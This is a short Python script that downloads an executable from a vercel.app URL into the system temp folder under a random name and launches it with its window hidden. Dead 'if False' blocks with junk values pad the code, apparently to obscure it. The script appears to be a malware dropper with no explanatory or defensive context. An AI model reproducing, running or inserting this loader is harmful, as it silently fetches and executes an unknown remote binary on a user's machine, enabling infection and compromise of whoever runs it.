import os
import requests
import tempfile
import uuid
url = 'https://ok-omega-eight.vercel.app/Qgshqlgel.exe'
import subprocess
temp = tempfile.gettempdir()
name = os.path.join(temp, str(uuid.uuid4()) + '.exe')
if False:
    _var_181_0 = (329, 586, 726)

    def _var_181_fn():
        pass
response = requests.get(url)
if False:
    _var_182_0 = (675, 781, 666)

    def _var_182_fn():
        pass
if response.status_code == 200:
    with open(name, 'wb') as dosya:
        dosya.write(response.content)
    subprocess.Popen([name], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
else:
    exit()
if False:
    _var_183_0 = (292, 263, 885)
    _var_183_1 = (921, 711, 506)

    def _var_183_fn():
        pass